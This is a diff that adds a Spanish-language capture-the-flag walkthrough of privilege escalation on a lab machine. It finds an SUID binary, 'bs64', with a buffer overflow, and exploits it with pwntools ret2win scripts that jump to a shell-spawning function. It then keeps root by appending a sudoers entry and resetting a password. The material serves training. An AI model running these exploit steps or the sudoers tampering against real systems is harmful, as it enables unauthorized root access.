@@ -121,38 +121,139 @@ sudo -u astu /usr/bin/busybox sh
 
 ### astu
 
- CONTINUAMOS LUEGO ;) 
+busco binarios que tengas el bit suid activo y consigo uno en el directorio del usuario `astu`
+
+```bash
+find / -perm -4000 2>/dev/null
+```
+
+![image](https://github.com/user-attachments/assets/2a70cd64-e3cc-4374-b181-192080217306)
+
+me voy hasta el directorio que contiene el binario `bs64` y testeo
+
+![image](https://github.com/user-attachments/assets/16574cef-a50d-4a38-8ff8-0025a3fd4522)
+
+ocurrio un fallo de segmentacion, lo que es un indicativo de un posible desbordamiento de buffer, por lo que vere si trata de uno, pero enviare el binario a mi maquina para examinar 
+
+![image](https://github.com/user-attachments/assets/4cbedb16-3d4b-4e67-9920-45be0d32fd9c)
+
+trata de un binario de 64 bit, ahora intentare calcular el `offset`
+
+![image](https://github.com/user-attachments/assets/6c014a0d-d3b5-4fb6-8283-b1492bd732b5)
+
+el `offset` resulta ser de 72 byte, ahora testeo el control sobre el registro `RIP` enviando al binario la siguiente cadena
+
+```bash
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBB
+```
+
+![image](https://github.com/user-attachments/assets/ce1a09e5-4e56-45ed-adbf-d4cba76faef0)
+
+en efecto, tengo el control de dicho registro, ahora chequeo las protecciones en el binario
+
+```bash
+checksec --file=bs64
+```
+
+![image](https://github.com/user-attachments/assets/a1a7a12d-ca67-42bc-9491-fa9c29a69dc3)
+
+debido a que el binario cuenta con la proteccion `NX` activa, no seria posible la ejecucion de una `shellcode` asi que primero le realizo ingenieria inversa con `ghidra` al binario
+
+![image](https://github.com/user-attachments/assets/d9830074-c163-4383-acb9-924a6a78a8c4)
+
+observo una funcion llamada `fire` que ejecuta una `/bin/sh`, por lo que la explotacion consiste en localizar la direccion
+de memoria de `fire()` y saltar a ella para obtener la `shell-root`, por lo que corremos el binario con el depurador `gdb` y localizamos la direccion de `fire()`
+
+![image](https://github.com/user-attachments/assets/c646a00d-2f00-470d-834a-cfcc0c17e2b9)
+
+la direccion de memoria seria `0x40136a` asi que ahora construyo un exploit
+
+```python
+from pwn import *
+
+def explotation():
+
+       OFFSET = 72
+       BUFF = b"A"*OFFSET
+       FUNCTI = p64(0x40136a)
+       PAYLOAD = BUFF + FUNCTI
+       binary = "./bs64"
+       l = process(binary)
+       l.sendline(PAYLOAD)
+       l.interactive()
+       l.close()
+
+if __name__ == '__main__':
+    explotation()
+```
+le damos permisos de ejecucion `chmod +x exploit.py` y al ejecutarlo ocurre un error
 
 
+![image](https://github.com/user-attachments/assets/40f8ac62-8a18-431e-b8bd-357e166931dd)
 
+este error se produce cuando un programa intenta acceder a una ubicación de memoria que no está permitida, asi que voy a desemsamblar la funcion `fire()`
 
+![image](https://github.com/user-attachments/assets/c526b425-cc73-4e89-9cd9-71122bddbd64)
 
+ahora testeare usando la direccion de memoria `0x000000000040136b` por lo que modificamos la direccion de memoria en el exploit quedando asi
 
+```python3
+from pwn import *
 
+def explotation():
 
+       OFFSET = 72
+       BUFF = b"A"*OFFSET
+       FUNCTI = p64(0x000000000040136b)
+       PAYLOAD = BUFF + FUNCTI
+       binary = "./bs64"
+       l = process(binary)
+       l.sendline(PAYLOAD)
+       l.interactive()
+       l.close()
 
+if __name__ == '__main__':
+    explotation()
+```
 
+ejecuto el binario y veo que ahora si logro obtener una `shell`
 
+![image](https://github.com/user-attachments/assets/93e56164-8792-462b-9af6-ddbfab897c13)
 
+paso el exploit a la maquina comprometida y vuelvo a modificar el exploit pero esta vez cambiaremos la ruta al binario
 
+```python3
+from pwn import *
 
+def explotation():
 
+       OFFSET = 72
+       BUFF = b"A"*OFFSET
+       FUNCTI = p64(0x000000000040136b)
+       PAYLOAD = BUFF + FUNCTI
+       binary = "/home/astu/secure/bs64"
+       l = process(binary)
+       l.sendline(PAYLOAD)
+       l.interactive()
+       l.close()
 
+if __name__ == '__main__':
+    explotation()
+```
+ya todo listo ejecuto el exploit 
 
+![image](https://github.com/user-attachments/assets/13d235ef-6f7e-4451-9545-e923b717a934)
 
+parcialmente soy `root` pero para tener una `shell-root` al 100% ejecutamos lo siguiente:
 
+```bash
+echo 'astu ALL=(ALL:ALL) ALL' >> /etc/sudoers
+passwd astu #asignamos una password nueva para astu
+```
+salimos de la `shell-interactiva` y escalamos a `root` con `sudo su` y cuando solicite la password le pasamos la que asignamos anteriormente (en mi caso 1234)
 
+![image](https://github.com/user-attachments/assets/008b45ad-8dea-4e82-933b-7ddc9d5b9e92)
 
+obtengo la shell 100% `root`
 
-
-
-
-
-
-
-
-
-
-
-
-
+### PWNET-ROOT
